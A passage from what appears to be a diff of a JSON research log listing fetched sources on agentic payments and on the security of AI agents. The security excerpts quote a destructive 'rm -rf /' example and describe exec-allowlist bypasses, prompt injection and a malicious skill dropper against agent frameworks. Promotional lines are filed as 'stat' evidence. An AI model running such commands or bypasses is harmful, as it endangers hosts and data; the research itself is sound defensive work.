settlement is fully trackable onchain via facilitator infrastructure.\n* **MPP (Machine Payments Protocol)** \u2014 supports both onchain and offchain payment methods; this dataset tracks only its onchain Tempo rails: Tempo Charge (one-time onchain payments) and Tempo Session (onchain escrow and settlement, with offchain usage metering between onchain events).\n\nEach row represents one onchain payment settlement \u2014 order creation, authorization, and intermediate protocol events that do not themselves settle onchain are excluded. Agentic payments feed into `payments.commerce_flows` as a Tier A (label-based) source, classified as `party_pair = b2b`, `purpose = commerce`, `confidence = high`.\n\n## Why this dataset matters\n\nAgentic payments let AI agents and automated services pay each other onchain without human involvement. Tracking them separately makes it possible to:\n\n* Measure the scale and growth of machine-to-machine payment activity.\n* Attribute stablecoin transfers to specific agentic protocols (x402, MPP).\n* Compare protocol adoption across chains and over time.\n\n## [\u200b](#coverage) Coverage\n\n**Protocols:** x402, MPP (onchain Tempo rails only). **Chains:** Base, Polygon, and Solana (x402); Tempo (MPP). **Tokens:** Not restricted to stablecoins \u2014 x402 rows can include EIP-3009 tokens (e.g. USDC, EURC), other ERC-20 tokens, and classic SPL token transfers on Solana. `settlement_pattern` is currently enriched only for decoded USDC EIP-3009 transfers on EVM; Permit2 and Solana settlement decoding are future phases. Native SOL and Token-2022 are not covered yet (excluded follow-ups). **x402 facilitators** are tracked via `facilitator_name`. New facilitators are added as they appear onchain.\n\n## [\u200b](#how-detection-works) How detection works\n\nDetection is protocol-specific:\n\n* **x402** is identified via known facilitator addresses and transfer patterns. On EVM, `s",
+        "status": "ok"
+      },
+      {
+        "source_id": "WEB-b8536a6b3c9c779d",
+        "kind": "web",
+        "url": "https://github.com/Merit-Systems/awesome-agentic-commerce",
+        "title": "GitHub - Merit-Systems/awesome-agentic-commerce: Curated resources for the agentic commerce ecosystem \u00b7 GitHub",
+        "retrieved_at": "2026-10-24T00:21:24.316010Z",
+        "published_at": null,
+        "evidence_text": "[Skip to content](#start-of-content)   \n \n \n\n## Navigation Menu\n\n[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FMerit-Systems%2Fawesome-agentic-commerce)\n\nAppearance settings\n\n[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FMerit-Systems%2Fawesome-agentic-commerce)\n\n[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=Merit-Systems%2Fawesome-agentic-commerce)\n\nAppearance settings\n\nYou signed in with another tab or window. Reload to refresh your session. You signed out in another tab or window. Reload to refresh your session. You switched accounts on another tab or window. Reload to refresh your session. Dismiss alert\n\n{{ message }}\n\n[Merit-Systems](/Merit-Systems)   /  **[awesome-agentic-commerce](/Merit-Systems/awesome-agentic-commerce)**  Public\n\n* [Notifications](/login?return_to=%2FMerit-Systems%2Fawesome-agentic-commerce)  You must be signed in to change notification settings\n* [Fork 592](/login?return_to=%2FMerit-Systems%2Fawesome-agentic-commerce)\n* [Star  150](/login?return_to=%2FMerit-Systems%2Fawesome-agentic-commerce)\n\n[Branches](/Merit-Systems/awesome-agentic-commerce/branches)[Tags](/Merit-Systems/awesome-agentic-commerce/tags)\n\nOpen more actions menu\n\n## Latest commit\n\n## History\n\n[80 Commits](/Merit-Systems/awesome-agentic-commerce/commits/master/)\n\n80 Commits\n\n## Folders and files\n\n| Name | Name | Last commit message | Last commit date |\n| --- | --- | --- | --- |\n| [README.md](/Merit-Systems/awesome-agentic-commerce/blob/master/README.md \"README.md\") | [README.md](/Merit-Systems/awesome-agentic-commerce/blob/master/README.md \"README.md\") |  |  |\n| [merit-logo-agentic-commerce.png](/Merit-Systems/awesome-agentic-commerce/blob/master/merit-logo-agentic-commerce.png \"merit-logo-agentic-commerce.png\") | [merit-logo-agentic-commerce.png](/Merit-Systems/awesome-agentic-commerce/blob/master/merit-logo-agentic-commerce.png \"merit-logo-agentic-commerce.png\") |  |  |\n| [merit-logo.webp](/Merit-Systems/awesome-agentic-commerce/blob/master/merit-logo.webp \"merit-logo.webp\") | [merit-logo.webp](/Merit-Systems/awesome-agentic-commerce/blob/master/merit-logo.webp \"merit-logo.webp\") |  |  |\n|  |\n\n## Repository files navigation\n\n# Awesome Agentic Commerce\n\nCurated resources for the x402 ecosystem: specs, repos, standards, and community. Contributions welcome via pull requests.\n\n### Quick Links\n\n* [Website](https://www.x402.org/)\n* [Spec / Repo](https://github.com/x402-foundation/x402)\n* [Explorer](https://x402scan.com/)\n\n### What is x402?\n\nx402 is an emerging open standard from the Coinbase ecosystem focused on safer, more composable authorization and transaction flows. This list tracks authoritative resources and adjacent standards commonly used alongside x402-style flows.\n\n### Official Resources\n\n* [x402 Official Website](https://www.x402.org)\n* [x402 Protocol Docs](https://docs.x402.org/introduction)\n* [x402 Foundation Docs](https://docs.x402.org/) ",
+        "status": "ok"
+      }
+    ],
+    "action": "web_search",
+    "query": "x402 MPP volume facilitators",
+    "query_attempts": [
+      {
+        "query": "x402 MPP volume facilitators",
+        "service_line": "agentic-payments",
+        "backend": "tavily",
+        "result_count": 5
+      }
+    ],
+    "url_events": [
+      {
+        "url": "https://www.visa.com/vcom-assets/content/dam/visa/reimagine-visa/thought-leadership/documents/agentic-payments-report.pdf",
+        "final_url": "https://www.visa.com/vcom-assets/content/dam/visa/reimagine-visa/thought-leadership/documents/agentic-payments-report.pdf",
+        "service_line": "agentic-payments",
+        "reason": "fetched"
+      },
+      {
+        "url": "https://github.com/Neji402/awesome-x402-engedi",
+        "final_url": "https://github.com/Neji402/awesome-x402-engedi",
+        "service_line": "agentic-payments",
+        "reason": "fetched"
+      },
+      {
+        "url": "https://github.com/RipperMercs/awesome-x402-xpaysh",
+        "final_url": "https://github.com/RipperMercs/awesome-x402-xpaysh",
+        "service_line": "agentic-payments",
+        "reason": "fetched"
+      },
+      {
+        "url": "https://docs.dune.com/data-catalog/curated/payments/agentic-payments",
+        "final_url": "https://docs.dune.com/data-catalog/curated/payments/agentic-payments",
+        "service_line": "agentic-payments",
+        "reason": "fetched"
+      },
+      {
+        "url": "https://github.com/Merit-Systems/awesome-agentic-commerce",
+        "final_url": "https://github.com/Merit-Systems/awesome-agentic-commerce",
+        "service_line": "agentic-payments",
+        "reason": "fetched"
+      }
+    ],
+    "failure": null
+  },
+  {
+    "record_id": "marketing_1/research/1/1",
+    "slot_id": "marketing_1",
+    "attempt": 1,
+    "pack": {
+      "slot_id": "marketing_1",
+      "topic_id": "ANGLE-agentic-payments",
+      "topic_name": "agentic-payments-x402-vs-mpp",
+      "sources": [
+        {
+          "source_id": "WEB-6336a84ca33f90b3",
+          "kind": "web",
+          "url": "https://www.visa.com/vcom-assets/content/dam/visa/reimagine-visa/thought-leadership/documents/agentic-payments-report.pdf",
+          "title": "Visa: Agentic Payments from the Ground Up",
+          "retrieved_at": "2026-10-24T00:21:24.315883Z",
+          "published_at": null,
+          "evidence_text": "July 2026 TRANSACTION SHAPE & NEW ARCHITECTURE REQUIREMENTS JULY 2026 JULY 2026 1.1 Defining Agentic Commerce Agentic commerce is a new economic surface where software autonomously discovers, evaluates, and executes transactions \u0013 continuously, programmatically, and across a far wider range of commerce than traditional payment infrastructure was designed to handle. The degree of autonomy varies. Some workflows keep a human in the loop to review or approve purchases, while others run fully autonomously once configured. Agents can buy SaaS licenses, book travel, automate accounts payable, reorder physical inventory, and commission creative work, often without human intervention at the moment of purchase. Within that broader landscape, a new sub-category of machine-native, sub-dollar transactions is also emerging: an AI agent calls an API, receives an HTTP 402 response (\u001cPayment Required\u001d), evaluates the price, pays, and consumes the resource. That cycle takes milliseconds and requires no checkout page, saved card, or browsing session \u0013 only a wallet or card, a budget, and an objective. For payment providers, the full spectrum of agentic commerce creates new transaction surfaces with different economics, risk controls, and infrastructure requirements from traditional e-commerce.\nAI crosses the line from chatbot to agent when it begins to reason through multi-step tasks, call external tools, evaluate results, and iterate on its approach autonomously. Agents built on frontier models like Claude, GPT, and Gemini are now deployed in production across every business vertical. Over the past year, these agents have become very capable at writing code and conducting research, but they are inherently limited by access.\nGiving agents the ability to pay removes that constraint: An IT agent purchases fifty additional seats on a SaaS platform after headcount changes.\nAn administrative agent reorders printer toner and breakroom supplies when inventory runs low.\nA research agent queries five financial data providers a few cents each for the same company\u2019s filings, then picks the most complete dataset.\nA marketing agent pays ten image-generation providers 5 cents each to render the same product shot, then selects the best output.\nAgentic payments span two distinct transaction categories. The first is macro, where an agent executes high-value, consumer-like purchases on behalf of a human (e.g., booking travel, managing subscriptions, ordering supplies). These transactions resemble traditional e-commerce, with the agent acting as a proxy for human intent. The second category is micro, characterized by high-frequency, low-value purchases (i.e., API calls, data queries, compute access, tool usage) initiated by the agent. Both categories are real and growing, but micro-transactions are the area where new payment architecture is most needed, and where new protocols are emerging to fill the gap.\nTwo open-source payment protocols have gone live in the past twelve months to",
+          "status": "ok"
+        },
+        {
+          "source_id": "WEB-2869b4da65b9ba10",
+          "kind": "web",
+          "url": "https://docs.dune.com/data-catalog/curated/payments/agentic-payments",
+          "title": "Agentic Payments - Dune Docs",
+          "retrieved_at": "2026-10-24T00:21:24.315985Z",
+          "published_at": null,
+          "evidence_text": "> ## Documentation Index\n>\n> Fetch the complete documentation index at:</llms.txt>\n>\n> Use this file to discover all available pages before exploring further.\n\n[Dune Docs home page![light logo](https://mintcdn.com/dune/zh-3B8LgVmyrKOaG/logo/dune-logo-light.svg?fit=max&auto=format&n=zh-3B8LgVmyrKOaG&q=85&s=6fec71d5070d0923eb2924321131b1c2)![dark logo](https://mintcdn.com/dune/zh-3B8LgVmyrKOaG/logo/dune-logo-dark.svg?fit=max&auto=format&n=zh-3B8LgVmyrKOaG&q=85&s=2501750983cc95aa72d40acc6f005bd9)](https://docs.dune.com/)\n\n[Docs](/)[Data Catalog](/data-catalog/overview)[API Reference](/api-reference/overview/introduction)[SQL Query Engine](/query-engine/overview)[Resources](/resources/credits-billing/overview)\n\nPayments\n\n# Agentic Payments\n\nMachine-to-machine onchain payment activity across open HTTP 402 payment standards \u2014 x402 and MPP (onchain Tempo rails only).\n\nThe `payments.agentic_payments` table captures machine-to-machine onchain payment activity settled through open payment standards built on HTTP 402. The dataset covers two protocols:\n\n* **x402** \u2014 an onchain-native payment standard. Payment settlement is fully trackable onchain via facilitator infrastructure.\n* **MPP (Machine Payments Protocol)** \u2014 supports both onchain and offchain payment methods; this dataset tracks only its onchain Tempo rails: Tempo Charge (one-time onchain payments) and Tempo Session (onchain escrow and settlement, with offchain usage metering between onchain events).\n\nEach row represents one onchain payment settlement \u2014 order creation, authorization, and intermediate protocol events that do not themselves settle onchain are excluded. Agentic payments feed into `payments.commerce_flows` as a Tier A (label-based) source, classified as `party_pair = b2b`, `purpose = commerce`, `confidence = high`.\n\n## Why this dataset matters\n\nAgentic payments let AI agents and automated services pay each other onchain without human involvement. Tracking them separately makes it possible to:\n\n* Measure the scale and growth of machine-to-machine payment activity.\n* Attribute stablecoin transfers to specific agentic protocols (x402, MPP).\n* Compare protocol adoption across chains and over time.\n\n## [\u200b](#coverage) Coverage\n\n**Protocols:** x402, MPP (onchain Tempo rails only). **Chains:** Base, Polygon, and Solana (x402); Tempo (MPP). **Tokens:** Not restricted to stablecoins \u2014 x402 rows can include EIP-3009 tokens (e.g. USDC, EURC), other ERC-20 tokens, and classic SPL token transfers on Solana. `settlement_pattern` is currently enriched only for decoded USDC EIP-3009 transfers on EVM; Permit2 and Solana settlement decoding are future phases. Native SOL and Token-2022 are not covered yet (excluded follow-ups). **x402 facilitators** are tracked via `facilitator_name`. New facilitators are added as they appear onchain.\n\n## [\u200b](#how-detection-works) How detection works\n\nDetection is protocol-specific:\n\n* **x402** is identified via known facilitator addresses and transfer patterns. On EVM, `s",
+          "status": "ok"
+        },
+        {
+          "source_id": "STAT-04",
+          "kind": "stat",
+          "url": null,
+          "title": "SanadSquad",
+          "retrieved_at": "2026-10-24T00:21:25.856634Z",
+          "published_at": null,
+          "evidence_text": "SanadSquad provides agentic payment protocol review for x402 and MPP, including integration review, facilitator trust, and payment policy design.",
+          "status": "ok"
+        },
+        {
+          "source_id": "STAT-05",
+          "kind": "stat",
+          "url": null,
+          "title": "SanadSquad",
+          "retrieved_at": "2026-10-24T00:21:25.856651Z",
+          "published_at": null,
+          "evidence_text": "Teams can request a review.",
+          "status": "ok"
+        }
+      ],
+      "kb_allowed": false
+    },
+    "evidence": [
+      {
+        "source_id": "WEB-6336a84ca33f90b3",
+        "kind": "web",
+        "url": "https://www.visa.com/vcom-assets/content/dam/visa/reimagine-visa/thought-leadership/documents/agentic-payments-report.pdf",
+        "title": "Visa: Agentic Payments from the Ground Up",
+        "retrieved_at": "2026-10-24T00:21:24.315883Z",
+        "published_at": null,
+        "evidence_text": "July 2026 TRANSACTION SHAPE & NEW ARCHITECTURE REQUIREMENTS JULY 2026 JULY 2026 1.1 Defining Agentic Commerce Agentic commerce is a new economic surface where software autonomously discovers, evaluates, and executes transactions \u0013 continuously, programmatically, and across a far wider range of commerce than traditional payment infrastructure was designed to handle. The degree of autonomy varies. Some workflows keep a human in the loop to review or approve purchases, while others run fully autonomously once configured. Agents can buy SaaS licenses, book travel, automate accounts payable, reorder physical inventory, and commission creative work, often without human intervention at the moment of purchase. Within that broader landscape, a new sub-category of machine-native, sub-dollar transactions is also emerging: an AI agent calls an API, receives an HTTP 402 response (\u001cPayment Required\u001d), evaluates the price, pays, and consumes the resource. That cycle takes milliseconds and requires no checkout page, saved card, or browsing session \u0013 only a wallet or card, a budget, and an objective. For payment providers, the full spectrum of agentic commerce creates new transaction surfaces with different economics, risk controls, and infrastructure requirements from traditional e-commerce.\nAI crosses the line from chatbot to agent when it begins to reason through multi-step tasks, call external tools, evaluate results, and iterate on its approach autonomously. Agents built on frontier models like Claude, GPT, and Gemini are now deployed in production across every business vertical. Over the past year, these agents have become very capable at writing code and conducting research, but they are inherently limited by access.\nGiving agents the ability to pay removes that constraint: An IT agent purchases fifty additional seats on a SaaS platform after headcount changes.\nAn administrative agent reorders printer toner and breakroom supplies when inventory runs low.\nA research agent queries five financial data providers a few cents each for the same company\u2019s filings, then picks the most complete dataset.\nA marketing agent pays ten image-generation providers 5 cents each to render the same product shot, then selects the best output.\nAgentic payments span two distinct transaction categories. The first is macro, where an agent executes high-value, consumer-like purchases on behalf of a human (e.g., booking travel, managing subscriptions, ordering supplies). These transactions resemble traditional e-commerce, with the agent acting as a proxy for human intent. The second category is micro, characterized by high-frequency, low-value purchases (i.e., API calls, data queries, compute access, tool usage) initiated by the agent. Both categories are real and growing, but micro-transactions are the area where new payment architecture is most needed, and where new protocols are emerging to fill the gap.\nTwo open-source payment protocols have gone live in the past twelve months to",
+        "status": "ok"
+      },
+      {
+        "source_id": "WEB-2869b4da65b9ba10",
+        "kind": "web",
+        "url": "https://docs.dune.com/data-catalog/curated/payments/agentic-payments",
+        "title": "Agentic Payments - Dune Docs",
+        "retrieved_at": "2026-10-24T00:21:24.315985Z",
+        "published_at": null,
+        "evidence_text": "> ## Documentation Index\n>\n> Fetch the complete documentation index at:</llms.txt>\n>\n> Use this file to discover all available pages before exploring further.\n\n[Dune Docs home page![light logo](https://mintcdn.com/dune/zh-3B8LgVmyrKOaG/logo/dune-logo-light.svg?fit=max&auto=format&n=zh-3B8LgVmyrKOaG&q=85&s=6fec71d5070d0923eb2924321131b1c2)![dark logo](https://mintcdn.com/dune/zh-3B8LgVmyrKOaG/logo/dune-logo-dark.svg?fit=max&auto=format&n=zh-3B8LgVmyrKOaG&q=85&s=2501750983cc95aa72d40acc6f005bd9)](https://docs.dune.com/)\n\n[Docs](/)[Data Catalog](/data-catalog/overview)[API Reference](/api-reference/overview/introduction)[SQL Query Engine](/query-engine/overview)[Resources](/resources/credits-billing/overview)\n\nPayments\n\n# Agentic Payments\n\nMachine-to-machine onchain payment activity across open HTTP 402 payment standards \u2014 x402 and MPP (onchain Tempo rails only).\n\nThe `payments.agentic_payments` table captures machine-to-machine onchain payment activity settled through open payment standards built on HTTP 402. The dataset covers two protocols:\n\n* **x402** \u2014 an onchain-native payment standard. Payment settlement is fully trackable onchain via facilitator infrastructure.\n* **MPP (Machine Payments Protocol)** \u2014 supports both onchain and offchain payment methods; this dataset tracks only its onchain Tempo rails: Tempo Charge (one-time onchain payments) and Tempo Session (onchain escrow and settlement, with offchain usage metering between onchain events).\n\nEach row represents one onchain payment settlement \u2014 order creation, authorization, and intermediate protocol events that do not themselves settle onchain are excluded. Agentic payments feed into `payments.commerce_flows` as a Tier A (label-based) source, classified as `party_pair = b2b`, `purpose = commerce`, `confidence = high`.\n\n## Why this dataset matters\n\nAgentic payments let AI agents and automated services pay each other onchain without human involvement. Tracking them separately makes it possible to:\n\n* Measure the scale and growth of machine-to-machine payment activity.\n* Attribute stablecoin transfers to specific agentic protocols (x402, MPP).\n* Compare protocol adoption across chains and over time.\n\n## [\u200b](#coverage) Coverage\n\n**Protocols:** x402, MPP (onchain Tempo rails only). **Chains:** Base, Polygon, and Solana (x402); Tempo (MPP). **Tokens:** Not restricted to stablecoins \u2014 x402 rows can include EIP-3009 tokens (e.g. USDC, EURC), other ERC-20 tokens, and classic SPL token transfers on Solana. `settlement_pattern` is currently enriched only for decoded USDC EIP-3009 transfers on EVM; Permit2 and Solana settlement decoding are future phases. Native SOL and Token-2022 are not covered yet (excluded follow-ups). **x402 facilitators** are tracked via `facilitator_name`. New facilitators are added as they appear onchain.\n\n## [\u200b](#how-detection-works) How detection works\n\nDetection is protocol-specific:\n\n* **x402** is identified via known facilitator addresses and transfer patterns. On EVM, `s",
+        "status": "ok"
+      },
+      {
+        "source_id": "STAT-04",
+        "kind": "stat",
+        "url": null,
+        "title": "SanadSquad",
+        "retrieved_at": "2026-10-24T00:21:25.856634Z",
+        "published_at": null,
+        "evidence_text": "SanadSquad provides agentic payment protocol review for x402 and MPP, including integration review, facilitator trust, and payment policy design.",
+        "status": "ok"
+      },
+      {
+        "source_id": "STAT-05",
+        "kind": "stat",
+        "url": null,
+        "title": "SanadSquad",
+        "retrieved_at": "2026-10-24T00:21:25.856651Z",
+        "published_at": null,
+        "evidence_text": "Teams can request a review.",
+        "status": "ok"
+      }
+    ],
+    "action": "resolved",
+    "query": "",
+    "query_attempts": [],
+    "url_events": [],
+    "failure": null
+  },
+  {
+    "record_id": "marketing_2/research_search/1/1",
+    "slot_id": "marketing_2",
+    "attempt": 1,
+    "pack": null,
+    "evidence": [
+      {
+        "source_id": "WEB-d4045185e23b4a24",
+        "kind": "web",
+        "url": "https://github.com/agentsid-dev/agentsid-scanner/blob/master/docs/state-of-agent-security-2026.md",
+        "title": "agentsid-scanner/docs/state-of-agent-security-2026.md at master \u00b7 AgentsID-dev/agentsid-scanner \u00b7 GitHub",
+        "retrieved_at": "2026-10-24T00:21:22.062046Z",
+        "published_at": null,
+        "evidence_text": "## Navigation Menu\n\n## Repository navigation\n\n## FilesExpand file tree\n\n## Breadcrumbs\n\n# state-of-agent-security-2026.md\n\n## Latest commit\n\n## History\n\n## Breadcrumbs\n\n# state-of-agent-security-2026.md\n\n## File metadata and controls\n\n# The State of MCP Server Security \u2014 2026\n\n**An empirical analysis of 100 Model Context Protocol servers**\n\nAgentsID Research \u00b7 March 2026\n\n## Abstract\n\nIn an audit of 100 MCP (Model Context Protocol) server packages \u2014 including the \"gold standard\" reference implementations maintained by Anthropic and Microsoft \u2014 every vendor-maintained server that exposed tools received a failing grade (F). Across the broader ecosystem, 71% of servers scored F. Zero scored A. We identified 893 total findings across 41 servers exposing 485 tools, including 163 instances of a novel vulnerability class we term \"hallucination-based vulnerabilities\" (HBVs) \u2014 security weaknesses unique to LLM-driven tool execution where vague or ambiguous tool definitions cause the language model to over-privilege, misroute, or behave unpredictably. Our scanner identifies the exact structural preconditions \u2014 unbounded string parameters, missing schema validation, vague scope boundaries \u2014 that led to the RCE-class CVEs disclosed against MCP servers in early 2026 (CVE-2025-68143, CVE-2025-68144, CVE-2025-9611). These findings demonstrate that the MCP specification is vulnerable by default: the protocol prioritizes developer flexibility over the schema strictness and semantic validation required for safe autonomous operation, and its own reference implementations confirm that insecurity is the path of least resistance.\n\n## 1. Introduction\n\nThe Model Context Protocol (MCP), introduced by Anthropic in November 2024 and adopted by OpenAI, Google, Microsoft, and Amazon, has become the de facto standard for connecting AI agents to external tools. As of March 2026, the MCP ecosystem has over 97 million monthly SDK downloads and more than 5,200 registered servers.\n\nMCP solves a real problem: it standardizes how AI models discover and call tools. But the protocol's security model is minimal by design. The MCP specification delegates authentication to the transport layer, provides no mechanism for per-tool authorization, defines no standard for agent identity, and includes no audit log format.\n\nThe result is an ecosystem where AI agents have unrestricted access to every tool a server exposes. An agent connecting to a database MCP server can SELECT and DROP with equal ease. An agent with a shell MCP server can `ls` and `rm -rf /` without distinction.\n\n`ls`\n`rm -rf /`\n\nThis report quantifies the scope of that problem.\n\n### 1.1 Prior Work\n\nPrevious security analyses of MCP servers include the Astrix Security state of MCP security report (2025), which found that 88% of MCP servers require credentials and only 8.5% use OAuth. Qualys TotalAI identified MCP servers as \"the new shadow IT\" for AI in March 2026. Individual vulnerability disclosures (CVE-2025-6514, the Postmar",
+        "status": "ok"
+      },
+      {
+        "source_id": "WEB-0dfda36973150b79",
+        "kind": "web",
+        "url": "https://arxiv.org/html/2603.27517v1",
+        "title": "A Systematic Taxonomy of Security Vulnerabilitiesin the OpenClaw AI Agent Framework",
+        "retrieved_at": "2026-10-24T00:21:22.062155Z",
+        "published_at": null,
+        "evidence_text": "##### Report GitHub Issue\n\nContent selection saved. Describe the issue below:\n\n![](/static/base/1.0.1/images/icons/smileybones-small.svg)\n![arXiv logo](/static/base/1.0.1/images/arxiv-logo-primary-light.svg)\n\n# A Systematic Taxonomy of Security Vulnerabilities in the OpenClaw AI Agent Framework\n\n###### Abstract\n\nAI agent frameworks that connect large language model (LLM) reasoning to host\nexecution surfaces\u2014shell, filesystem, containers, browser automation, and\nmessaging platforms\u2014introduce a class of security challenges that differs\nstructurally from those of conventional software. We present a systematic\n*security taxonomy* of 190 advisories filed against OpenClaw\n[[1](#bib.bib1)], an open-source AI agent runtime, organizing the corpus\nby *architectural layer* and *trust-violation type*. Our taxonomy reveals that vulnerabilities cluster along two\northogonal axes: (1)\u00a0the *system axis*, which reflects where in the\narchitecture a vulnerable operation occurs (exec policy, gateway, channel\nadapters, sandbox, browser, plugin/skill, agent/prompt layers); and\n(2)\u00a0the *attack axis*, which reflects the adversarial technique applied\n(identity spoofing, policy bypass, cross-layer composition, prompt injection,\nsupply-chain trust escalation).\nGrounding our taxonomy in patch-differential evidence, we derive three\nprincipal findings. First, three independently Moderate- or High-severity advisories [[6](#bib.bib6), [7](#bib.bib7)] exist within the Gateway and Node-Host subsystems. By mapping these through the Delivery, Exploitation, and Command-and-Control stages of the Cyber Kill Chain, they compose into a complete unauthenticated remote code execution path from an LLM tool call to the host process. Second, the exec allowlist\n[[8](#bib.bib8), [9](#bib.bib9), [10](#bib.bib10)], which is the framework\u2019s primary\ncommand-filtering mechanism, embeds a closed-world assumption that command\nidentity is recoverable by lexical parsing. This assumption is invalidated by line\ncontinuation, busybox multiplexing, and GNU long-option abbreviation in\nindependent and non-overlapping ways. Third, a malicious skill distributed\nthrough the plugin channel [[13](#bib.bib13)] executed a two-stage dropper\nentirely within the LLM context, bypassing the exec pipeline entirely and\nillustrating that the skill distribution surface constitutes an attack vector\noutside any runtime policy primitive. Across all categories, the dominant\nstructural pattern is per-layer, per-call-site trust enforcement rather than\nunified policy boundaries\u2014a design property that makes cross-layer composition\nattacks systematically resistant to layer-local remediation.\n\n## 1\u2003\u200aIntroduction\n\n##### AI agent frameworks as an execution surface.\n\nThe deployment of large language models as autonomous agents\u2014systems that\nperceive external input, reason over it, and produce actions with real-world\neffects\u2014introduces a qualitatively different security problem from that of\nconventional application software. In a tradition",
+        "status": "ok"
+      },
+      {
+        "source_id": "WEB-db7293c51b9d49f6",
+        "kind": "web",
+        "url": "https://arxiv.org/html/2605.09721v1",
+        "title": "Security Risks in Tool-Enabled AI Agents:A Systematic Analysis of Privileged Execution EnvironmentsExtended Author Preprint",
+        "retrieved_at": "2026-10-24T00:21:22.062215Z",
+        "published_at": null,
+        "evidence_text": "##### Report GitHub Issue\n\nContent selection saved. Describe the issue below:\n\n![](/static/base/1.0.1/images/icons/smileybones-small.svg)\n![arXiv logo](/static/base/1.0.1/images/arxiv-logo-primary-light.svg)\n\n# Security Risks in Tool-Enabled AI Agents: A Systematic Analysis of Privileged Execution Environments Extended Author PreprintThanks:\u00a0This is an extended author preprint. A shortened version of this work has been accepted as a short paper at IEEE COMPSAC 2026. The final published version will appear in IEEE Xplore.\n\n###### Abstract\n\nTool-enabled AI agents are increasingly deployed in cloud-hosted environments and offered as services, where they perform side-effecting operations through privileged tools within execution environments. While such agents enable powerful automation, the security implications of hosting autonomous agents in privileged execution environments are not yet fully explored. This paper presents a structured analysis of security risks associated with cloud-hosted AI agents. We introduce a taxonomy of risk categories, illustrate these risks through three representative agent scenarios, and discuss mitigation strategies along with their tradeoffs. A small controlled experiment empirically illustrates risk manifestation and the effect of lightweight mitigations in this setup. Our analysis suggests that many risks in autonomous cloud agents arise not from novel vulnerabilities, but from over-privileged tools, capability\u2013intent mismatches, and ambient authority leakage in execution environments. Based on these findings, we derive practical design guidelines for deploying AI agents in the cloud more securely.\n\n###### Index Terms:\n\n## I Introduction\n\nTool-enabled AI agents are increasingly deployed in cloud-hosted environments and offered as services [[1](#bib.bib1), [2](#bib.bib2)], where they perform side-effecting operations through privileged tools operating within cloud execution environments. Unlike purely conversational AI systems, these agents can execute commands, read and modify files, access environment variables, and call APIs-capabilities that enable powerful autonomy [[3](#bib.bib3)] but also introduce security risks that differ from traditional software vulnerabilities as well as conversational AI systems.\n\nWhen such agents act in privileged execution environments like cloud VMs or containers, they inherit ambient authority that extends beyond their intended scope. This ambient authority can lead to unintended consequences, such as unauthorized data access [[4](#bib.bib4)], elevation of privileges, and secret exfiltration. The reported ROME incident [[5](#bib.bib5)] illustrates how an enterprise AI agent can effectively act as an insider threat through inherited credentials and over-broad authority. In practice, agents are often granted capabilities that exceed the scope required for their intended tasks, resulting in capability-intent mismatches where agents possess more authority than necessary. Such risks are ",
+        "status": "ok"
+      },
+      {
+        "source_id": "WEB-28b73a344c58dac3",
+        "kind": "web",
+        "url": "https://arxiv.org/html/2608.05884v1",
+        "title": "The Vulnerability With No CVE Managing Persistent Gaps Between Mandate and Authority in AI Coding Agents Position Paper",
+        "retrieved_at": "2026-10-24T00:21:22.062265Z",
+        "published_at": null,
+        "evidence_text": "##### Report GitHub Issue\n\nContent selection saved. Describe the issue below:\n\n![](/static/base/1.0.1/images/icons/smileybones-small.svg)\n![arXiv logo](/static/base/1.0.1/images/arxiv-logo-primary-light.svg)\n\n# The Vulnerability With No CVE Managing Persistent Gaps Between Mandate and Authority in AI Coding Agents Position Paper\n\n###### Abstract\n\nExisting guidance identifies excessive agency, excessive permission, weak task-bound authorization, and inadequate agent controls as important risks. Control frameworks also describe capabilities for constraining, authorizing, observing, validating, and responding to agent activity. Yet security programs still need a way to manage persistent deployed instances that span components and outlive any one event.\n\nWe propose the *agentic posture vulnerability* (APV) as a task-conditioned vulnerability-management abstraction: a durable record for a composed agent-control exposure. One posture may produce different runtime manifestations across tasks; APV links those manifestations to the invariant posture and remains open until authority is narrowed, a missing control is added, risk is accepted, or closure is verified. APV is not proposed as a new root-cause class of risk; it operationalizes existing excessive-agency, authorization, and control-composition weaknesses.\n\nWe distinguish APVs from CVE-addressable product defects, OWASP Excessive Agency, Agent Baseline control outcomes, and the runtime authorization\u2013execution gap. We then provide a field vignette, a thresholded definition, six recurring APV patterns, a vulnerability lifecycle, a minimum record, a control-and-closure matrix, tooling implications, and a testable research agenda.\n\nKeywords: AI coding agents, agentic posture vulnerability, vulnerability management, excessive agency, authorization, least privilege, security posture, runtime governance\n\n## 1 Introduction\n\nVulnerability management works best when a weakness can be named, located, and remediated. A package has a vulnerable version. A product defect receives an identifier. A scanner maps the flaw to affected assets, a supplier ships a fix, and the security team verifies closure. The CVE program is valuable because it gives tools and teams a shared reference for publicly disclosed product vulnerabilities ([CVE Program, n.d.](#bib.bib4)).\n\nNot every material weakness is a product defect. Excessive privilege, unsafe defaults, exposed identities, architectural gaps, and security-relevant configuration weaknesses can create exposure even when no software function is broken ([Johnson et\u00a0al., 2011](#bib.bib6)).\n\nFor coding agents, the remaining operational question is how to represent a persistent deployed exposure that spans components and outlives any one alert or runtime trajectory. The relevant posture can include the agent harness, model, tools, plugins, connectors, inherited developer identity, credentials, network reach, approval settings, environment boundaries, and telemetry. The weakness ",
+        "status": "ok"
+      },
+      {
+        "source_id": "WEB-c6314847413b045d",
+        "kind": "web",
+        "url": "https://cheatsheetseries.owasp.org/cheatsheets/AI_Agent_Security_Cheat_Sheet.html",
+        "title": "AI Agent Security - OWASP Cheat Sheet Series",
+        "retrieved_at": "2026-10-24T00:21:22.062315Z",
+        "published_at": null,
